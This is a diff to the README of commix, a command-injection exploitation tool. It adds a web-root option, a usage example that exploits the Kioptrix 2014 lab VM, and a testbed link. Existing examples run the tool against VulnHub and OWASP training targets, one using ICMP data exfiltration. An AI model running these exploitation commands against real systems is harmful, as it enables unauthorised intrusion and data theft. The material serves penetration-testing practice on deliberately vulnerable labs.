@@ -87,6 +87,8 @@ Download commix by cloning the Git repository:
     --base64            Use Base64 (enc)/(de)code trick to prevent false-
                         positive results.
     --tmp-path=TMP_P..  Set remote absolute path of temporary files directory.
+    --root-dir=SRV_R..  Set remote absolute path of web server's root
+                        directory (Default: /var/www/).
     --icmp-exfil=IP_..  Use the ICMP exfiltration technique (e.g.
                         'ip_src=192.168.178.1,ip_dst=192.168.178.3').
     --alter-shell       Use an alternative os-shell (Python). Available only
@@ -103,13 +105,16 @@ Download commix by cloning the Git repository:
 
     python commix.py --url="http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE" --prefix="'" --suffix="//"
     
-**Exploiting [OWASP Mutillidae] (https://www.owasp.org/index.php/Category:OWASP_Mutillidae) using Extra headers and HTTP proxy:**
+**Exploiting [OWASP Mutillidae] (https://www.owasp.org/index.php/Category:OWASP_Mutillidae) using extra headers and HTTP proxy:**
 
     python commix.py --url="http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&page=dns-lookup.php" --data="target_host=INJECT_HERE" --headers="Accept-Language:fr\nETag:123\n" --proxy="127.0.0.1:8081"
 
 **Exploiting [Persistence] (https://www.vulnhub.com/entry/persistence-1,103/) using ICMP exfiltration technique :**
 
     su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
+
+**Exploiting [Kioptrix: 2014 (#5)] (https://www.vulnhub.com/entry/kioptrix-2014-5,62/) using custom user-agent and specified injection technique:**
+    python commix.py --url="http://192.168.178.6:8080/phptax/drawimage.php?pfilez=INJECT_HERE&pdf=make" --user-agent="Mozilla/4.0 Mozilla4_browser" --technique="file-based" --root-dir="/"
 
 
 ####Command injection testbeds.
@@ -121,4 +126,5 @@ A collection of pwnable VMs, that includes web apps vulnerable to command inject
 - [Pentester Lab: Web For Pentester] (https://www.vulnhub.com/entry/pentester-lab-web-for-pentester,71/)
 - [Pentester Academy: Command Injection ISO: 1] (https://www.vulnhub.com/entry/command-injection-iso-1,81/)
 - [SpiderLabs: MCIR (ShelLOL)](https://github.com/SpiderLabs/MCIR/tree/master/shellol)
+- [Kioptrix: 2014 (#5)]((https://www.vulnhub.com/entry/kioptrix-2014-5,62/)
 - [...]
